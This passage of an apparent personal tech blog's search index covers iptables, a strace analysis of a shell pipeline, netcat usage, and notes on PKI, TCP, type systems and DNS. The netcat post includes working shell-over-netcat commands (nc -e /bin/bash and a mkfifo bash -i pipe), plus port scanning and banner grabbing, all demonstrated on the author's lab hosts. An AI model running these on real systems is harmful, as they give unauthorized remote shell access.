对数据包做特定的处理\nfilter table default mangle table nat table raw table ","target#target":"terminating target 一旦匹配立刻决定一个网络包的最终命运。如 ACCEPT,DROP,REJECT chain 上的 target 依次匹配, 一旦匹配就执行关联的操作。匹配不到执行默认的 target 可以配置 default policy, 也是一个 target 所有 chain 的 default policy 是 ACCEPT non-terminating target 如 LOG 记录 kernel 日志 ","数据包#数据包":"数据包 接收 发送 转发 路由器 ","默认的-iptables-配置#默认的 iptables 配置":" 所有 chain 的默认 policy 都是 ACCEPT\n[root@node96 ~]# iptables -t filter -L -n --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t nat -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain INPUT (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination Chain POSTROUTING (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t mangle -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain INPUT (policy ACCEPT) num target prot opt source destination Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination Chain POSTROUTING (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t raw -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination "},"title":"Master Iptables"},"/blog/master-linux-pipe/":{"data":{"":"","file-descriptor#file descriptor":"","pipeline-流程详细分析#pipeline 流程详细分析":"✅ Step 1: Pipe Creation 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 The parent shell creates a pipe with two file descriptors: 3: Read end (for wc) 4: Write end (for cat) pipe2() is a modern variant of pipe() that supports flags. Here, no flags are set (0), so it behaves like pipe(). ✅ Step 2: Forking Child Processes First Child (PID 27641) – runs cat 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 27641 The parent shell uses clone() to create a child process. This is how fork() is implemented in modern glibc — via clone() with SIGCHLD. Second Child (PID 27642) – runs wc -l 27640 13:23:49.478608 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 27642 The parent shell creates a second child process. Again, this is a fork() under the hood. ✅ Step 3: Redirecting File Descriptors First Child (PID 27641) – cat 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.475737 close(4) = 0 Redirects stdout (FD 1) to the write end of the pipe (FD 4). Closes the redundant FD 4 after duplication. Second Child (PID 27642) – wc 27642 13:23:49.480811 dup2(3, 0) = 0 27642 13:23:49.482849 close(3) = 0 Redirects stdin (FD 0) to the read end of the pipe (FD 3). Closes the redundant FD 3 after duplication. ✅ Step 4: Executing Commands cat Process (PID 27641) 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], ...) = 0 Replaces child process with cat /etc/passwd. Now cat writes its output to the pipe. wc Process (PID 27642) 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], ...) = 0 Replaces child process with wc -l. Now wc reads input from the pipe and counts lines. ✅ Step 5: Parent Shell Cleanup 27640 13:23:49.474244 close(4) = 0 27640 13:23:49.479006 close(3) = 0 The parent shell closes both ends of the pipe. This ensures the reader (wc) knows when the writer (cat) has finished (when all writers have closed the pipe). ✅ Step 6: Process Exit Both child processes exit cleanly:\n[pid 27641] +++ exited with 0 +++ [pid 27642] +++ exited with 0 +++ And finally, the parent shell exits:\n[pid 27640] +++ exited with 0 +++ ","references#References":" IO redirection in shell sys-call-clone sys-call-dup2 sys-call-pipe2 sys-call-execve supported by qwen ","sh-系统调用追踪#\u003ccode\u003esh\u003c/code\u003e 系统调用追踪":"file descriptor A file descriptor, or FD, is a positive integer that refers to an input/output source. 指向 I/O 源,不关心具体的源是什么, 这就是抽象\n所谓 I/O redirection 不过是对指定的 FD 复制而已\nsh 系统调用追踪 shell pipeline 流程 complete lifecycle of a shell pipeline (cat /etc/passwd | wc -l) executed via sh.\n✅ pipe2() (pipe creation, kernel managed buffer, pipe[0] read pipe[1] write) ✅ clone() (Linux process creation, replaces fork()) ✅ dup2() (redirects stdin/stdout) ✅ execve() (runs cat and wc -l) strace -f -tt -s 1000 -o pipe.log -e trace=pipe2,clone,execve,dup2,close sh -c 'cat /etc/passwd | wc -l' 27640 13:23:49.436915 execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"cat /etc/passwd | wc -l\"], 0x7ffcc4e072a0 /* 65 vars */) = 0 27640 13:23:49.446359 close(3) = 0 27640 13:23:49.452650 close(3) = 0 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77cc40b30a10) = 27641 27640 13:23:49.474244 close(4) = 0 27641 13:23:49.474851 close(3) = 0 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.475737 close(4) = 0 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], 0x6292fba9d0f8 /* 65 vars */ \u003cunfinished ...\u003e 27640 13:23:49.477420 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD \u003cunfinished ...\u003e 27641 13:23:49.477659 \u003c... execve resumed\u003e) = 0 27640 13:23:49.478608 \u003c... clone resumed\u003e, child_tidptr=0x77cc40b30a10) = 27642 27640 13:23:49.479006 close(3) = 0 27640 13:23:49.480741 close(-1 \u003cunfinished ...\u003e 27642 13:23:49.480811 dup2(3, 0) = 0 27640 13:23:49.481370 \u003c... close resumed\u003e) = -1 EBADF (Bad file descriptor) 27642 13:23:49.482849 close(3) = 0 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], 0x6292fba9d128 /* 65 vars */) = 0 27641 13:23:49.486693 close(3) = 0 27642 13:23:49.487874 close(3) = 0 27642 13:23:49.491607 close(3) = 0 27641 13:23:49.494576 close(3) = 0 27642 13:23:49.500190 close(3) = 0 27642 13:23:49.502045 close(3) = 0 27642 13:23:49.504291 close(3) = 0 27641 13:23:49.507177 close(3) = 0 27641 13:23:49.515626 close(3) = 0 27641 13:23:49.516854 close(1) = 0 27641 13:23:49.517974 close(2) = 0 27642 13:23:49.519465 close(0 \u003cunfinished ...\u003e 27641 13:23:49.519562 +++ exited with 0 +++ 27642 13:23:49.519778 \u003c... close resumed\u003e) = 0 27642 13:23:49.520356 close(1 \u003cunfinished ...\u003e 27640 13:23:49.520949 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=27641, si_uid=1000, si_status=0, si_utime=0, si_stime=0} --- 27642 13:23:49.521080 \u003c... close resumed\u003e) = 0 27642 13:23:49.521383 close(2) = 0 27642 13:23:49.523033 +++ exited with 0 +++ 27640 13:23:49.523476 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=27642, si_uid=1000, si_status=0, si_utime=0, si_stime=0} --- 27640 13:23:49.527449 +++ exited with 0 +++ strace 过滤 grep -E 'pipe2|clone|dup2|execve' pipe.log 27640 13:23:49.436915 execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"cat /etc/passwd | wc -l\"], 0x7ffcc4e072a0 /* 65 vars */) = 0 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77cc40b30a10) = 27641 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], 0x6292fba9d0f8 /* 65 vars */ \u003cunfinished ...\u003e 27640 13:23:49.477420 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD \u003cunfinished ...\u003e 27641 13:23:49.477659 \u003c... execve resumed\u003e) = 0 27640 13:23:49.478608 \u003c... clone resumed\u003e, child_tidptr=0x77cc40b30a10) = 27642 27642 13:23:49.480811 dup2(3, 0) = 0 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], 0x6292fba9d128 /* 65 vars */) = 0 进程 ID Parent Shell (sh): PID 27640 Child 1 (cat): PID 27641 Child 2 (wc): PID 27642 数据流向 Pipe Setup:\npipe2([3,4]) creates a communication channel: 3: Read end (used by wc) 4: Write end (used by cat) Child 1 (cat):\ndup2(4, 1) → Redirects cat’s stdout to the pipe. execve(\"cat\", ...) → cat writes /etc/passwd to the pipe. Child 2 (wc):\ndup2(3, 0) → Redirects wc’s stdin to the pipe. execve(\"wc\", ...) → wc reads from the pipe and counts lines. Parent Cleanup:\nCloses both ends of the pipe (close(3) and close(4)) to prevent resource leaks. 数据流可视化 +-------------------+ | Parent Shell | | (PID 27640) | +-------------------+ | | 🔵 pipe2([3,4], 0) ▼ +-------------------+ | Pipe: | | Read: FD 3 | | Write: FD 4 | +-------------------+ | | 🟢 clone(SIGCHLD) → PID 27641 | 🟢 clone(SIGCHLD) → PID 27642 ▼ +-------------------+ +-------------------+ | Child 27641 (cat) | | Child 27642 (wc) | +-------------------+ +-------------------+ | 🟡 dup2(4, 1) | | 🟡 dup2(3, 0) | | 🔴 close(4) | | 🔴 close(3) | | 🟠 execve(\"cat\") | | 🟠 execve(\"wc\") | | → Writes to pipe | | → Reads from pipe | +-------------------+ +-------------------+ | ↑ | | +--------------------------+ Data flow via pipe ","涉及系统调用总结#涉及系统调用总结":" PID Action Description 27640 pipe2([3, 4], 0) Creates pipe 27640 clone(...) Forks first child (PID 27641) 27640 clone(...) Forks second child (PID 27642) 27641 dup2(4, 1) Redirects stdout to pipe write end 27642 dup2(3, 0) Redirects stdin to pipe read end 27641 execve(\"cat\", ...) Replaces child with cat 27642 execve(\"wc\", ...) Replaces child with wc -l 27640 wait() Waits for both children to finish "},"title":"Master Linux Pipe"},"/blog/master-netcat/":{"data":{"basic-syntax-and-options#\u003cstrong\u003eBasic Syntax and Options\u003c/strong\u003e":"","common-use-cases#\u003cstrong\u003eCommon Use Cases\u003c/strong\u003e":"Mastering the nc (Netcat) Command in LinuxNetcat (nc) allows you to read and write data across network connections using TCP or UDP protocols.\nTable of Contents Mastering the nc (Netcat) Command in Linux Table of Contents What is Netcat? Basic Syntax and Options Common Use Cases 1. Port Scanning 端口扫描 2. Creating a Chat Server 聊天服务器 3. File Transfer 传输文件 4. Port Forwarding 端口转发 5. Banner Grabbing 服务类型抓取 6. Testing UDP Services UDP 测试 7. Reverse Shell (Ethical Hacking) 反向 shell 服务端1 客户端1 服务端2 客户端2 References What is Netcat? Netcat is a versatile tool for:\nNetwork debugging Port scanning File transfers Simple proxying Banner grabbing Reverse shells It works with both TCP (default) and UDP protocols. Some versions include ncat (Nmap Project) or cryptcat (with encryption).\nBasic Syntax and Options nc [options] hostname port Common Options:\n-z: Zero-I/O mode, report connection status only,Scan mode (no data exchange). -v: --verbose output -u: --udp UDP protocol -l: --listen Bind and listen for incoming connections -p: --source-port Specify source port to use -w: --wait, Connect timeout -k: --keep-open, accept multiple connections in listen mode -n: --no-dns, skip DNS resolution (faster). -e: --exec Executes the given command Common Use Cases 1. Port Scanning 端口扫描 Check if a port or range of ports is open:\n# Scan a single port nc -zv github.com 80 Connection to github.com port 80 [tcp/http] succeeded! # Scan ports 20-100 nc -zv example.com 20-100 2. Creating a Chat Server 聊天服务器 Set up a simple chat between two machines:\n# Listener (Server) nc -lvp 1234 # Client (Connect to Server) nc 192.168.1.10 1234 Type messages on either side and press Enter. Exit with Ctrl+C.\n3. File Transfer 传输文件 Transfer files over a network:\n# Sender (Client) nc -nv example.com 4444 \u003c file.txt # Receiver (Server) nc -lvnp 4444 \u003e received.txt Directory Example:\n# Compress and send tar -czf - /path/to/dir | nc -lvp 5555 # Receive and extract nc 192.168.1.10 5555 | tar -xzf - 4. Port Forwarding 端口转发 Forward traffic from local port 8080 to a remote server:\n# Local Forwarder nc -lvp 8080 | nc remotehost 80 例子\n[root@node96 ~]# nc -lvp 9999 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::9999 Ncat: Listening on 0.0.0.0:9999 Ncat: Connection from 10.10.200.97. Ncat: Connection from 10.10.200.97:50360. aaaaaaa [root@node97 ~]# nc -lvp 8888 | nc 10.10.200.96 9999 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::8888 Ncat: Listening on 0.0.0.0:8888 Ncat: Connection from 10.10.200.97. Ncat: Connection from 10.10.200.97:34254. [root@node97 ~]# nc 10.10.200.97 8888 aaaaaaa Bidirectional Forwarding (Advanced):\nmkfifo pipe nc -lvp 8080 \u003c pipe | nc remotehost 80 \u003e pipe 5. Banner Grabbing 服务类型抓取 Retrieve service banners for reconnaissance:\n[root@node96 ~]# nc -v 10.10.200.96 22 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:22. SSH-2.0-OpenSSH_7.4 6. Testing UDP Services UDP 测试 Test UDP-based services (e.g., DNS):\n[root@node96 ~]# nc -uvz 1.1.1.1 53 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 1.1.1.1:53. Ncat: UDP packet sent successfully Ncat: 1 bytes sent, 0 bytes received in 2.02 seconds. Note: UDP is connectionless, so responses may vary.\n7. Reverse Shell (Ethical Hacking) 反向 shell 服务端1 [root@node96 ~]# nc -l -vv -p 5879 -e /bin/bash Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::5879 Ncat: Listening on 0.0.0.0:5879 客户端1 [root@node97 ~]# nc -v 10.10.200.96 5879 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:5879. ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:17:86:e5 brd ff:ff:ff:ff:ff:ff inet 10.10.200.96/16 brd 10.10.255.255 scope global noprefixroute ens33 valid_lft forever preferred_lft forever inet 10.10.123.234/16 scope global secondary ens33 valid_lft forever preferred_lft forever inet6 fe80::c51e:7f4e:355f:57d2/64 scope link noprefixroute valid_lft forever preferred_lft forever 服务端2 rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/bash -i 2\u003e\u00261 | nc -l 8888 \u003e /tmp/f 客户端2 出现了服务端的命令行操作端, 相当危险的\n[root@node97 ~]# nc -v 10.10.200.96 8888 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:8888. [root@node96 ~]# hostname hostname node96 ","mastering-the-nc-netcat-command-in-linux#Mastering the \u003ccode\u003enc\u003c/code\u003e (Netcat) Command in Linux":"","references#References":" 这些Linux命令，不会有人教你！ ncat ","table-of-contents#\u003cstrong\u003eTable of Contents\u003c/strong\u003e":"","what-is-netcat#\u003cstrong\u003eWhat is Netcat?\u003c/strong\u003e":""},"title":"Master Netcat"},"/blog/master-pki/":{"data":{"certificate#certificate":"certificate 目标：绑定 public key 和 name。一切围绕着这个目标来展开。","references#References":" 强烈推荐-everything-pki 翻译版-everything-pki ubuntu-trust-store-location decode-an-ssl-certificate csr-在线解析 github-public-key dns-caa-record X.509 ","图解#图解":""},"title":"Master Pki"},"/blog/master-tcp/":{"data":{"basic-data-transfer#basic data transfer":"","connections#connections":" Each connection is uniquely specified by a pair of sockets identifying its two sides.(source ip, source port),(destination ip, destination port)\nsockets sequence numbers window size ","flow-control#flow control":" window size ","multiplexing#multiplexing":" socket (ip, port) ","reliability#reliability":" sequence number acknowledgement ","tcp-header-format#TCP header format":" The Transmission Control Protocol (TCP) is intended for use as a highly reliable host-to-host protocol between hosts in packet-switched computer communication networks, and in interconnected systems of such networks.\nTCP header format","tcp-建立连接目的#TCP 建立连接目的":" 交换通信双方的 ISN (Initial Sequence Number) 凡是占据序列号的任何TCP报文，一定对方确认，如果没有收到确认，会一直重传，直到达到规定的上限次数。 syn , data , fin 占据 sequence number 需要确认. ack 不占据 sequence number 不需要确认.","参考链接#参考链接":" TCP three way handshake 1 TCP three way handshake 2 rfc793 "},"title":"master-tcp"},"/blog/master-type-system/":{"data":{"ambiguous-interpretation#Ambiguous Interpretation":"","bits-are-just-bits#Bits Are Just Bits":"","bridging-human-intent---machine-execution#Bridging Human Intent \u0026lt;-\u0026gt; Machine Execution":"","how-types-work-under-the-hood#How Types Work \u0026ldquo;Under the Hood\u0026rdquo;？":"","java-代码理解#java 代码理解":"","no-guardrails#No Guardrails":"为啥需要 type system?type 就是契约 At the hardware level, the machine does not know types in the way humans or high-level programming languages do. 硬件级别就是电信号了。type 这种概念不存在。 Bits are just bits (0s and 1s), and the CPU/memory has no intrinsic understanding of “integers,” “strings,” or “objects.” But types exist in programming languages to impose structure on those raw bits, guiding both the programmer and the compiler/interpreter on how to interpret and manipulate data safely and meaningfully. Bridging Human Intent \u003c-\u003e Machine Execution Types act as a contract\nFor humans: They make code readable and intentional (e.g., int age vs. string name). For compilers: They generate correct, optimized machine code (e.g., using ADD vs. FADD for integers vs. floats). 编译器根据数据类型使用相应的指令 For safety: They prevent invalid operations (e.g., multiplying a string by a file handle). 硬件视角下的数据Bits Are Just Bits 按照硬件电路的设计，就是一系列电信号而已。\nNo inherent types 没有所谓的类型。\nTo the CPU, memory is a giant array of bytes. When you write 42 (integer) or “hello” (string), the machine sees only binary patterns like 00101010 or 01101000 01100101 01101100 01101100 01101111.\nOperations are “type-agnostic” 给定一个指令，指令就会按照设计好的功能来使用 bits, 不管这个 bits 到底是啥。\nThe CPU executes instructions (e.g., ADD, MOV) based on the binary values in registers, not their “meaning.” For example:\nADD treats bits as integers (using arithmetic circuits). MOV copies bits blindly from one location to another. The same bits could represent an integer, a float, or part of a string, depending on context. How Types Work “Under the Hood”？Types are a human/compiler abstraction layered on top of raw bits\nHere’s how they translate to the machine:\nCompiler/Interpreter Assigns Meaning A high-level language (e.g., C, Python) assigns semantic meaning to bits using types. For example: int x = 42: The compiler allocates 4 bytes (32 bits) and encodes 42 as 00101010…, then enforces that x can only be used in integer operations (e.g., x + 5). float y = 3.14: The same 4 bytes are interpreted as an IEEE 754 floating-point number. char* s = “hello”: The compiler stores the ASCII codes for each character in memory and treats the variable as a pointer to the first byte. Without types, the compiler wouldn’t know how to generate correct machine code (e.g., integer vs. floating-point arithmetic instructions).\nRuntime Type Tracking (Dynamically Typed Languages) In languages like Python or JavaScript, types are checked at runtime. For example: x = 42 # Interpreter tags `x` as an integer internally. x = \"hello\" # Later, the tag changes to \"string.\" The interpreter keeps metadata (e.g., type tags) to track what the bits represent. This adds overhead but allows flexibility.\nWhat Happens Without High-Level Type Abstractions?If you remove types from the equation (e.g., programming in raw assembly or using memory pointers without safeguards):\nAmbiguous Interpretation The same bits can be misused as different types, leading to chaos:\n// C code (no runtime type checking)\nint x = 42; float* y = (float*)\u0026x; // Reinterpret the bits of `x` as a float. printf(\"%f\", *y); // Prints nonsense: 42 as a float ≈ 5.9e-44. Undefined Behavior • Memory corruption: Writing a string into memory allocated for an integer:\nint* arr = malloc(sizeof(int) * 5); arr[5] = 100; // Buffer overflow (undefined behavior). • Security vulnerabilities: Treating data as executable code (e.g., injection attacks).\nNo Guardrails • You could “add” a string to a file handle, and the CPU would try to execute it, resulting in crashes or garbage output.","square-字节码查看#Square 字节码查看":"javap -c Square\nclass Square { Square(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"\u003cinit\u003e\":()V 4: return static int square(int); Code: 0: iload_0 1: iload_0 2: imul 3: ireturn static float square(float); Code: 0: fload_0 1: fload_0 2: fmul 3: freturn static long square(long); Code: 0: lload_0 1: lload_0 2: lmul 3: lreturn } 可以看到编译器根据 type 使用了对应的 mul 指令\n可以看到 int 类型对应的指令有 imul 可以看到 float 类型对应的指令有 fmul 可以看到 long 类型对应的指令有 lmul ","squarejava#Square.java":" class Square { static int square(int num) { return num * num; } static float square(float num){ return num * num; } static long square(long num){ return num * num; } } ","type-就是契约#\u003ccode\u003etype\u003c/code\u003e 就是契约":"","undefined-behavior#Undefined Behavior":"","what-happens-without-high-level-type-abstractions#What Happens Without High-Level Type Abstractions?":"","为啥需要-type-system#为啥需要 type system?":"","总结#总结":"Types are a tool for humans, not the machine. Without them, programming would require manually managing every bit and operation, akin to writing assembly code for every program—a recipe for bugs and inefficiency","硬件视角下的数据#硬件视角下的数据":""},"title":"Master Type System"},"/blog/my-source-list/":{"data":{"":" https://arthurchiao.art/ https://alexanderell.is/posts/ https://blog.ryanlevick.com/ https://brennan.io/blog/ https://bhoot.dev/ https://chsasank.com/ https://codewords.recurse.com/ https://crockford.com/blog.html https://devconnected.com/ https://joearms.github.io/ https://jitwxs.cn/ https://kiosk007.top/ https://kunststube.net/ https://linuxize.com/post/ https://matt.might.net/ https://www.marcobehler.com/ https://natanyellin.com/posts/ https://robertovitillo.com/blog https://research.swtch.com/ Russ Cox https://strikefreedom.top/ https://serhack.me/blog/ https://www.0xffffff.org/ https://www.booleanworld.com/ https://www.jmeiners.com/ https://www.timdbg.com/ https://www.taniarascia.com/ https://manybutfinite.com/archives/ 胡涂说 秋风的笔记 朱双印 陈树义 "},"title":"My Source List"},"/blog/my-tool-box/":{"data":{"digital#digital":"","explorer#explorer":" AST WASM compiler assembler brainfuck-visualizer ","java#java":"","video--audio#video \u0026amp; audio":"","windows#windows":"video \u0026 audio lux ttsmaker 表格 ascii-table 元素周期表 digital socpk 颜色 中国色 传统色 网络 WiFi 连接卡 海底电缆 工具集 油小猴 开发工具 神秘的热心网友 波特工具站 java JDK 启动盘制作 https://rufus.ie/zh/ https://ventoy.net/ windows sysinternals ","启动盘制作#启动盘制作":"","工具集#工具集":"","编程#编程":" cron-expression crontab explainshell ","网络#网络":"","表格#表格":"","隐私#隐私":" Cover Your Tracks browserleaks ","颜色#颜色":""},"title":"My Tool Box"},"/blog/name-id-pairs/":{"data":{"name-id-pairs#name id pairs":"name id pairs 对于 OS 来说，id 更重要。\nsymbolic name(human readable name) number name(low level name) service name port user name user id process name process id host name ip address file name inode number signal name signal number syscall name syscall number "},"title":"Name Id Pairs"},"/blog/network-dhcp/":{"data":{"":"","dhcp-步骤#DHCP 步骤":"","references#References":"DHCP 步骤 Discover Offer Request ACK References 127.0.0.1 和 0.0.0.0 DHCP-Basics full-packet-friday-dhcp dynamic-host-configuration-protocal dhcp-rfc "},"title":"network-dhcp"},"/blog/network-dns/":{"data":{"":" 怎样学习一个新的东西，也可以按照一定的套路的。这个东西解决什么问题？这个东西怎样解决问题？ 还有没有其他方法？","dig-命令#dig 命令":"dig domainname ~ dig github.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e github.com ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 23033 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;github.com. IN A ;; ANSWER SECTION: github.com. 17 IN A 52.74.223.119 # github.com. 这个域名对应的一个 ip ;; Query time: 14 msec ;; SERVER: 61.139.2.69#53(61.139.2.69) ;; WHEN: Thu Apr 23 19:53:17 CST 2020 ;; MSG SIZE rcvd: 44 wireshark 抓包验证实际的网络架构 TCP/IP stack dig +trace domainname ~ dig +trace github.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e +trace github.com ;; global options: +cmd . 81219 IN NS k.root-servers.net. . 81219 IN NS e.root-servers.net. . 81219 IN NS b.root-servers.net. . 81219 IN NS a.root-servers.net. . 81219 IN NS m.root-servers.net. . 81219 IN NS l.root-servers.net. . 81219 IN NS d.root-servers.net. . 81219 IN NS f.root-servers.net. . 81219 IN NS g.root-servers.net. . 81219 IN NS h.root-servers.net. . 81219 IN NS j.root-servers.net. . 81219 IN NS c.root-servers.net. . 81219 IN NS i.root-servers.net. ;; Received 228 bytes from 61.139.2.69#53(61.139.2.69) in 15 ms #local dns server，本地 DNS 拥有完整的 root server ip 列表。内置到本地 DNS 服务器。 com. 172800 IN NS l.gtld-servers.net. # 记录 com. 这个顶级域名的服务器，generic top level domain server com. 172800 IN NS b.gtld-servers.net. com. 172800 IN NS c.gtld-servers.net. com. 172800 IN NS d.gtld-servers.net. com. 172800 IN NS e.gtld-servers.net. com. 172800 IN NS f.gtld-servers.net. com. 172800 IN NS g.gtld-servers.net. com. 172800 IN NS a.gtld-servers.net. com. 172800 IN NS h.gtld-servers.net. com. 172800 IN NS i.gtld-servers.net. com. 172800 IN NS j.gtld-servers.net. com. 172800 IN NS k.gtld-servers.net. com. 172800 IN NS m.gtld-servers.net. com. 86400 IN DS 30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766 com. 86400 IN RRSIG DS 8 1 86400 20200506050000 20200423040000 48903 . Enqd4bffSJHlv8mqHcAptS9+fHo3cg6vCIQgrOZ3aBfx2nG4CjS27iEG 6u6NsPfcKVrz7RoU2xDtDMNJOcMBJdJe/lGNeo14N69SM0/MV2Z8wZBD HRPd2Y8Z1nyc7EnDbkFzuWV5G6vafaQa4KTQpG6jGOPIQpYESNiinxfy 0QQWUJELvjSOideCPqQcug2P2Pln7BzWiqFSg6I8d1h44349LsXcbr5W zJwZQJKLoDd0ysyGl5Bq3UZgfWYvTJFmmZ/OwKYT4QQ4BE0MtbVwae8X 9yI6d9jENsz+eebEEtxLt6o/LNQb3PdNhUH1PC1pxfHiEiNyYUcvbJdf Flgntg== ;; Received 1170 bytes from 192.203.230.10#53(e.root-servers.net) in 211 ms # 从 e.root-servers.net 这个 root server 查询到的 TLD namesever，也就是存储 com. 这个顶级域名的服务器。 github.com. 172800 IN NS ns1.p16.dynect.net. # 记录 github.com. 这个域名的权威服务器 github.com. 172800 IN NS ns3.p16.dynect.net. github.com. 172800 IN NS ns2.p16.dynect.net. github.com. 172800 IN NS ns4.p16.dynect.net. github.com. 172800 IN NS ns-520.awsdns-01.net. github.com. 172800 IN NS ns-421.awsdns-52.com. github.com. 172800 IN NS ns-1707.awsdns-21.co.uk. github.com. 172800 IN NS ns-1283.awsdns-32.org. CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q1GIN43N1ARRC9OSM6QPQR81H5M9A NS SOA RRSIG DNSKEY NSEC3PARAM CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20200427045033 20200420034033 39844 com. BDAWMm4AsSRfrBwOXhNN8ihw++J2UkhEk8A6LeSIz1llDs5kt0CcOqTM OK1txlQNr3N0k1RTBW/hkEZ1mxjIHF2GARt/hpO43ILPBVs/vhKAKCKh A96XJG+NzN0t/heB6mFNASKAcmVdfT5a0tVkmmzhGktDp5ECdZAIFRhZ 8y6jxsUhGP7ZiN1AfFBi1cWeSth5FW4Btpy9RffVKg5lIA== 4KB4DFS71LEP8G8P8VT4CCUSQNL4CNCS.com. 86400 IN NSEC3 1 1 0 - 4KB4PTQQ5CTA7POCTGM7RUFC8B1RKTEU NS DS RRSIG 4KB4DFS71LEP8G8P8VT4CCUSQNL4CNCS.com. 86400 IN RRSIG NSEC3 8 2 86400 20200428061912 20200421050912 39844 com. PFN1p6XvR4SmD4ucRULmtYIMQkFf/ZrdEWz6bRVtcepYF6QwTC/VOVYM 7PV0tuTTdr1LqkUwQJ7mv23vtKnjFba2Cf7pBOTz9JuCHUC0Qml9cOc6 Cwjhx7haj6h0VEzS+oIY7l2p/af/B36iQCXASVN3Y6s/i+66iXIg905z GqFnAKOgR0R4KJx5KwHIzBkgxr/I/SyCd+HNw+2fr15X0w== ;; Received 824 bytes from 192.26.92.30#53(c.gtld-servers.net) in 173 ms # 从 c.gtld-servers.net 这个 TLD nameserver 查询到存储 github.com. 这个域名的权威服务器。 github.com. 60 IN A 13.250.177.223 # 得到了 github.com. 这个域名的一个 ip github.com. 900 IN NS ns-1707.awsdns-21.co.uk. github.com. 900 IN NS ns3.p16.dynect.net. github.com. 900 IN NS ns2.p16.dynect.net. github.com. 900 IN NS ns-1283.awsdns-32.org. github.com. 900 IN NS ns-421.awsdns-52.com. github.com. 900 IN NS ns-520.awsdns-01.net. github.com. 900 IN NS ns4.p16.dynect.net. github.com. 900 IN NS ns1.p16.dynect.net. ;; Received 275 bytes from 204.13.250.16#53(ns2.p16.dynect.net) in 198 ms 从 ns2.p16.dynect.net 这个权威服务器查询到的 github.com. 的 ip 是 13.250.177.223。至此，得到域名对应的 ip。 ","dns-记录类型#DNS 记录类型":"CNAME Canonical Name 域名指向另一个域名。见下图：\ndig -t cname music.163.com ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e -t cname music.163.com ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 12400 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;music.163.com.\tIN\tCNAME ;; ANSWER 